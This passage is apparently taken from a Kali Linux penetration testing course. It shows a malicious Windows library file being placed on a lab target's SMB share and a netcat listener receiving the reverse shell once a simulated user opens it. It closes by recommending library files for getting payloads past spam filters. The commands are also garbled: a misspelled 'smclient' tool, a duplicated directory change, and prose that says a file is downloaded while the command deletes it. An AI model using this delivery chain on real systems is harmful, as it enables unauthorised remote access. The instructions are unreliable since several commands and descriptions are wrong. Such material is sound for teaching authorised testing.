Penetration Testing with Kali Linux

To upload the library file to the SMB share, we'll use smclient⁴⁵⁰ with the -c parameter to specify the put config.Library-ms command. Before execute smclient, we need to change our current directory to the file's directory. We'll also download the pre-created test.txt file from the WebDAV share.

```
kali@kali:-$ cd webdav
kali@kali:~/webdav$ cd webdav
kali@kali:~/webdav$ rm test.txt
```

```
kali@kali:~/webdav$ smclient //192.168.50.195/share -c 'put config.Library-ms'
Enter WORKGROUP\kali's password:
putting file config.Library-ms \config\Library-ms (1.8 k/s) (average 1.8 k/s)
```

After we put the file on the target's machine via smclient, a simulated user on the system opens it and reverses the reverse shell by executing the shortcut file.

```
kali@kali:-$ nc -nvlp 4444
listening on [any] 4444 ....
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839

```

Library files are a great way to deliver our second stage payloads without exposing them to security technologies such as spam filters.
